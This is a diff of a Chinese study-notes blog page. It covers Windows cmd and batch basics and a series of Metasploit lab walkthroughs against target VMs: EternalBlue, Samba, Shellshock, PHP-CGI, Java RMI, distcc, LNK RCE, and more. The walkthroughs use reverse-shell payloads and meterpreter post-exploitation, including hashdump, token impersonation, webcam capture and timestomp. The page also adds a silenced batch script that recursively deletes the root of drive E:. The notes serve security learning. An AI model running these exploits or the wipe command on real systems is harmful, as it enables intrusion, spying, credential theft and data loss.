@@ -175,13 +175,13 @@
         <h3 id="window命令"><a href="#window命令" class="headerlink" title="window命令"></a>window命令</h3><ol>
 <li>cd :直接退到更目录下  </li>
 <li>rd :删除空文件夹  </li>
-<li>rd /s /q:无条件删除空文件夹  /s 表示包括子文件夹，/q表示无需提示</li>
+<li>rd /s /q:无条件删除空文件夹  /s 表示包括子文件夹也就是目录树，/q表示无需提示，安静模式</li>
 <li>echo 字符串 &gt;&gt; 路径 + 文件名.扩展名 ：将字符串写入到文件夹中，写在最后面  </li>
 <li>echo  字符串 &gt; 路径 + 文件名.扩展名 ：将字符串覆盖原有内容  </li>
 <li>type 文件名.扩展名：浏览该文件</li>
 <li>del 文件名.扩展名 ：删除文件  </li>
 <li>copy con 文件名.扩展名：在控制台输入文字到文件中，回车后开始编辑，按住ctrl + z 结束编辑    </li>
-<li>del <em>.</em> /s /q :删除所有文件 /s表示  </li>
+<li>del <em>.</em> /s /q :删除所有文件 /s表示包括所有空文件夹  </li>
 <li>attrib +h 文件夹  ：隐藏文件夹 h表示hidden  </li>
 <li>attrib -h 文件夹名称 ：取消隐藏文件夹  </li>
 <li>shutdown -s -t 秒:定时关机，-s表示关机 -t表示时间  </li>
@@ -193,8 +193,35 @@
 <li>./：当前路径名  </li>
 <li>../:上一级路径  </li>
 <li>move  原文件路径名 目标文件路径名：移动文件  </li>
-<li>ren 旧名 新名 ：将文件/文件夹重命名，ren是rename的缩写</li>
+<li>ren 旧名 新名 ：将文件/文件夹重命名，ren是rename的缩写  </li>
+<li>/P 删除每一个文件之前提示确认。<br>/F 强制删除只读文件。<br>/S 从所有子目录删除指定文件。<br>/Q 安静模式。删除全局通配符时，不要求确认。<br>/A 根据属性选择要删除的文件。<br>attributes R 只读文件 S 系统文件<br>H 隐藏文件 A 存档文件 </li>
 </ol>
+<ul>
+<li>表示“否”的前缀<h2 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h2>批处理文件 文件名.bat<br>里面执行的使dos命令<br>开头写上@echo off 关闭回显及不显示执行过程，只显示执行结果，结尾写上pause防止闪退，&gt;nul &nbsp;2&gt;nul表示屏蔽输出，及不管执行正确与否都不会显示输出</li>
+</ul>
+<p>代码</p>
+<pre><code>@echo off  
+color 0a
+title my title
+echo ===========
+echo the programe
+echo============
+pause
+echo rubbish is cleaning....
+E: &gt;nul 2&gt;nul //进入E盘使用 &gt; nul 2&gt;nul是为了防止出现报错信息
+cd / &gt;nul 2&gt;nul
+rd ./s/q &gt;nul 2&gt;nul
+ping -n 127.0.0.1 &gt;nul 2&gt;nul
+echo congratulation
+pause
+如果不加&gt;nul 2nul 就会出现如下情况:  
+the programe
+请按任意键继续. . .  
+rubbish is cleaning....  
+.\$RECYCLE.BIN - 拒绝访问。  
+.\SYSTEM~1 - 拒绝访问。
+congratulation  
+请按任意键继续. . .</code></pre><p>：冒号用来区分区块的,相当于swith语句中的case，使用goto语句可以跳转到区块位置</p>
 
       
 
@@ -313,7 +340,7 @@
 <h3 id="MSF渗透测试二"><a href="#MSF渗透测试二" class="headerlink" title="MSF渗透测试二"></a>MSF渗透测试二</h3><p>利用自己创建链接获取控制其他计算机的权限    </p>
 <ol>
 <li>同上  </li>
-<li>同上  search ms10_018</li>
+<li>同上  search ms10_018  </li>
 <li>同上  </li>
 <li>use exploit/windows/browser/ms10_018_ie_behaviors  </li>
 <li>set SRVHOST:表示设置反弹回来的服务器，即攻击成功后，获取权限后，将权限返回到哪个服务器，这里我们选择kali的ip地址  </li>
@@ -340,17 +367,179 @@
 </ol>
 <h3 id="渗透测试四"><a href="#渗透测试四" class="headerlink" title="渗透测试四"></a>渗透测试四</h3><p>永恒之蓝 ms17-010  即勒索病毒</p>
 <ol>
-<li>同上  </li>
-<li>search ms-17-010  </li>
-<li>use exploitwindows/smb/ms17-010-eternalblue  </li>
-<li>show options</li>
-<li>set RHOST win7主机,set LHOST kali主机ip ：配置RHOST 和LHOST   </li>
-<li>set payload windows/x64/smb/meterpreter/reverse_tcp  </li>
-<li>run：运行攻击    </li>
-<li>拿shell，获取计算机权限。</li>
-<li>遇到的问题，win7的网络模式需设置为桥接模式，否则在nat模式中是无法连接网络的。</li>
+<li><p>同上  </p>
+</li>
+<li><p>search ms-17-010  </p>
+</li>
+<li><p>use exploitwindows/smb/ms17-010-eternalblue  </p>
+</li>
+<li><p>show options  </p>
+</li>
+<li><p>set RHOST win7主机,set LHOST kali主机ip ：配置RHOST 和LHOST     </p>
+</li>
+<li><p>set payloads windows/x64/smb/meterpreter/reverse_tcp    </p>
+</li>
+<li><p>run：运行攻击    </p>
+</li>
+<li><p>拿shell，获取计算机权限。</p>
+</li>
+<li><p>遇到的问题，win7的网络模式需设置为桥接模式，否则在nat模式中是无法连接网络的。</p>
+<h3 id="渗透测试五"><a href="#渗透测试五" class="headerlink" title="渗透测试五"></a>渗透测试五</h3><p>linux漏洞  </p>
+</li>
+<li><p>进入msf</p>
+</li>
+<li><p>search scanner/samba  </p>
+</li>
+<li><p>use auxiliary/scanner/smb/smb_version：设置版本  </p>
+</li>
+<li><p>set RHOST ip地址  :设置被攻击ip  </p>
+</li>
+<li><p>run ：开始运行  </p>
+</li>
+<li><p>use expoit/multi/samba/usermap_script  </p>
+</li>
+<li><p>set RHOST ip地址：设置被攻击ip  </p>
+</li>
+<li><p>exploit ：开始攻击  </p>
+</li>
+<li><p>拿shell  </p>
+</li>
 </ol>
-<hr>
+<h3 id="另一种linux漏洞"><a href="#另一种linux漏洞" class="headerlink" title="另一种linux漏洞"></a>另一种linux漏洞</h3><p>影响了samba3.5以后的版本，不包括4.6.4/4.5.10/4.4.14 </p>
+<ol>
+<li>samba -v：查看samba版本  </li>
+<li>vi /etc/samba/smb.conf：打开目录下这个文件，/表示root根目录下   </li>
+<li>在末行加入  <pre><code>[public]   
+    comment = public  
+    broweseable = yes  
+    writeable = yes  
+    path = /tmp/public  
+    public = yes  
+    read only = no  </code></pre></li>
+<li>mkdir /tmp/public :在linux2017中添加共享目录  </li>
+<li>chmod 777 /tmp/public :修改读写权限  </li>
+<li>/etc/init.d/samba restart :重启samba  </li>
+<li>ps aux |grep samba : 查看samba进程  </li>
+<li>netstat -tnlp samba ：查看端口  </li>
+<li>进入msf，use exploit/linux/samba/is_known_pipename :利用模块  </li>
+<li>set RHOST：设置RHOST  </li>
+<li>run：拿shell    </li>
+<li>check：检查靶机是否存在该漏洞  </li>
+</ol>
+<h3 id="破壳漏洞"><a href="#破壳漏洞" class="headerlink" title="破壳漏洞"></a>破壳漏洞</h3><p>原理: CGI脚本利用了bash命令，由于bash版本较低，攻击者把有害数据写入环境变量，传入服务器端，触发服务器运行bash命令，完成攻击  </p>
+<ol>
+<li>进入到靶机的 usr/lib/cgi-bin目录下，输入sudo nano hello.sh :sudo表示linux系统管理员权限 nano 表示打开某一个文件进行编辑，类似于vim  </li>
+<li>对hello.sh进行编辑,输入echo “Content-type : text/html” echo “hello world”   </li>
+<li>sudo chmod s775 hello.sh:为文件赋予权限  </li>
+<li>攻击机中启动msf，搜索 search shellshock  </li>
+<li>use exploit/multi/apache_mod_cgi_bash-env-exec  </li>
+<li>set Rhost:  </li>
+<li>set targeturi /cgi-bin/hello.sh  </li>
+<li>set payload linux/x86/shell/reverse_tcp  </li>
+<li>check ,exploit<br>攻击失败</li>
+</ol>
+<h3 id="PHP-CGI漏洞"><a href="#PHP-CGI漏洞" class="headerlink" title="PHP CGI漏洞"></a>PHP CGI漏洞</h3><ol>
+<li>进入msf  </li>
+<li>search cve:2012-1823  </li>
+<li>use exploit/multi/http php_cgi_arg_injection</li>
+<li>options  </li>
+<li>set RHOST ip地址  </li>
+<li>run  <h3 id="Java-RMI-SERVER漏洞"><a href="#Java-RMI-SERVER漏洞" class="headerlink" title="Java RMI SERVER漏洞"></a>Java RMI SERVER漏洞</h3></li>
+<li>Java rmi server 的注册表和rmi激活服务的默认配置存在安全漏洞导致代码执行  </li>
+<li>search java_rmi_server  </li>
+<li>use exploit/multi/misc/java_rmi_server  </li>
+<li>set RHOST ip地址  </li>
+<li>run  </li>
+<li>shell  </li>
+</ol>
+<h3 id="java-cve-2013-0422漏洞"><a href="#java-cve-2013-0422漏洞" class="headerlink" title="java cve-2013-0422漏洞"></a>java cve-2013-0422漏洞</h3><ol>
+<li>进入msf  </li>
+<li>search java_jre17_jmxbean  </li>
+<li>use exploit/multi/browser/java_jre17_jmxbean  </li>
+<li>set RHOST ip地址  </li>
+<li>set target  </li>
+<li>set payload linux/x86…..  </li>
+<li>set LHOST  </li>
+<li>run  </li>
+</ol>
+<h3 id="distcc后门漏洞"><a href="#distcc后门漏洞" class="headerlink" title="distcc后门漏洞"></a>distcc后门漏洞</h3><p>distcc用于大量代码在网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是xcode1.5版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制    </p>
+<ol>
+<li>进入msf  </li>
+<li>search distcc_exec  </li>
+<li>use expoit/unix/misc/distcc_exec  </li>
+<li>set RHOST  </li>
+<li>run  </li>
+</ol>
+<h3 id="druby命令执行漏洞"><a href="#druby命令执行漏洞" class="headerlink" title="druby命令执行漏洞"></a>druby命令执行漏洞</h3><p>druby配置不当，被滥用执行命令，druby是个编程语言，msf中的工具就是由druby写的，端口8787  </p>
+<ol>
+<li>启动msf  </li>
+<li>search drb_remote_codeexec  </li>
+<li>use exploit/linux/drb_remote_codeexec  </li>
+<li>set RHOST  </li>
+<li>set URL druby://ip地址:8787</li>
+<li></li>
+</ol>
+<h3 id="震网三代"><a href="#震网三代" class="headerlink" title="震网三代"></a>震网三代</h3><p>CVE-2017-8464文件远程代码执行漏洞，当系统在解析快捷方式时，存在远程执行任意代码的高危漏洞<br>CVE-2017-8543windows，window处理内存中的对象，存在搜索远程命令执行漏洞<br>攻击机kali<br>靶机win7</p>
+<ol>
+<li>进入msf  </li>
+<li>search 2017——8464  </li>
+<li>use exploit/windows/fileformat/cve_2017_8464_lnk_rce  </li>
+<li>set payload windows/meterpreter/reverse_tcp  </li>
+<li>set LOST 攻击机IP  </li>
+<li>exploit  </li>
+<li>会在路径下生成一些文件，将该文件放到win7中  </li>
+<li>开始设置msf监听。  </li>
+<li>在msf下，search multi/handler  </li>
+<li>use exploit/multi/handler  </li>
+<li>set payload windows/meterpreter/reverse_tcp  </li>
+<li>set LHOST ip  </li>
+<li>run  </li>
+</ol>
+<h3 id="flash-0day病毒"><a href="#flash-0day病毒" class="headerlink" title="flash 0day病毒"></a>flash 0day病毒</h3><p>不好用</p>
+<h3 id="MSF辅助模块"><a href="#MSF辅助模块" class="headerlink" title="MSF辅助模块"></a>MSF辅助模块</h3><ol>
+<li><p>Auxiliary模块，情报搜集阶段<br> 可以使用 whois 来进行信息搜集（linux自带whois）例如 whois baidu.com<font color = red>这里不要添加www.</font> 进行域名详细信息查询<br> ip地址详细信息查询，whois 114.114.114.114<br> 利用辅助模块查找邮箱 use auxiliary/gather/search_email_collector,设置domain也就是域名，<a href="http://www.baidu.com,将Google关掉" target="_blank" rel="noopener">www.baidu.com,将Google关掉</a> set search_google false ,run即可，因为百度中没有存在邮箱，所以搜索为0<br> 或者使用枚举 use auxiliary/gather/enum_dns<br> set domin baidu.com <font color = red>注意这里域名不要加www.因为枚举模块会自动添加</font>，run即可  </p>
+</li>
+<li><p>端口扫描模块<br> （1）nmap：namp -sV 192.168….<br> （2）syn扫描：扫描器向目标主机端口发送请求链接的syn包，扫描器收到syn/ack后，不是发送ack应答，而是发送rst包请求断开，这样没有完成三次握手，无法建立连接，因此这种扫描不会被记录到系统日志中，及不会留下痕迹，但是这种扫描需要root权限。<br> 使用：use auxiliary/scanner/portscan/syno<br> options -&gt;set RHOSTS ——》set threads(设置线程为100) 100-》run<br> （3）TCP扫描：use auxiliary/scanner/portscan/tcp-&gt;set RHOSTS -&gt;set threads  </p>
+</li>
+<li><p>服务版本信息检测<br>1（smb）<br>服务器消息块（Server Message Block，缩写为SMB），又称网络文件共享系统（Common Internet File System，缩写为CIFS, /ˈsɪfs/），一种应用层网络传输协议，由微软开发，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通讯等资源。它也提供经认证的行程间通信机能。<br> 使用:use auxiliary/scanner/smb/smb_version -&gt;set RHOSTS -&gt;run<br>2(SSH版本扫描)<br>SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题<br>使用:use auxiliray/scanner/ssh/ssh_version ——&gt; set RHOSTS<br>3(FTP)版本扫描<br>文件传输协议（File Transfer Protocol，FTP）是用于在网络上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输而不是 UDP， 客户在和服务器建立连接前要经过一个“三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。<br>使用：use auxiliary/scanner/ftp/ftp_verson -&gt;set RHOSTS -&gt;set threads-&gt;run  </p>
+<h3 id="拿到meterpreter-shell之后，后期攻击方法"><a href="#拿到meterpreter-shell之后，后期攻击方法" class="headerlink" title="拿到meterpreter shell之后，后期攻击方法"></a>拿到meterpreter shell之后，后期攻击方法</h3><ol>
+<li><p>上传文件到windows主机 命令upload <file> <destination>        </p>
+</li>
+<li><p>下载主机上的文件 download <file> &lt;保存路径&gt;<font color = red>注意windows路径要使用下划线</font>   </p>
+</li>
+<li><p>在靶机上执行exe文件 ：execute -f &lt;路径&gt;  </p>
+</li>
+<li><p>创建cmd新通道,即在靶机上执行命令提示符 execute -f cmd -c </p>
+</li>
+<li><p>显示进程 ： ps  </p>
+</li>
+<li><p>获取靶机的cmd shell :shell  </p>
+</li>
+<li><p>获取admin权限：getsystem  </p>
+</li>
+<li><p>使用hashdump转存所有hash值  </p>
+</li>
+<li><p>创建端口转发：meterpreter shell中<font color = red>注意这里需要使用正确的payload获得meterpreter权限</font>可以让攻击系统访问无法直接访问的主机，例如内网。使用 获取到meterpreter之后，使用portfwd add -l 6666 -p 3389 -r 127.0.0.1将靶机的3389转发到本地的6666端口，这样我们访问127.0.0.1时就可以访问靶机。  </p>
+</li>
+<li><p>删除端口转发<br>portfwd delete -l &lt;端口名&gt; -p &lt;端口名&gt; -r &lt;目标主机&gt;  </p>
+</li>
+<li><p>在目标主机上搜索文件<br>search -f *.txt  </p>
+</li>
+<li><p>获取用户id<br>getuid</p>
+</li>
+<li><p>获取系统信息<br>sysinfo  </p>
+</li>
+<li><p>模拟任意用户（taken操作）<br>use incognito：假冒用户takens<br>例子 getuid   查看当前系统id<br> use incognito 伪装<br> list tokens -u 列出目标用户的可用令牌<br> impersonate_token”Machine\user”<br> getuid  </p>
+</li>
+<li><p>webcam摄像头命令<br>webcam_list:查看摄像头<br>webcam__snap :通过摄像头拍照<br>webcam_stream:通过摄像头开启视频  </p>
+</li>
+<li><p>execute执行文件<br>execute -H -i -f cmd.exe  #创建新进程cmd.exe -H不可见，-i交互  </p>
+</li>
+<li><p>timestomp伪造时间戳<br>timestomp C:// -h 查看帮助<br>timestomp -v C://2.txt 查看文件的时间戳<br>timestomp C://2.txt -f C://1.txt 将1.txt的时间戳复制给2.txt</p>
+</li>
+</ol>
+</li>
+</ol>
 
       
 
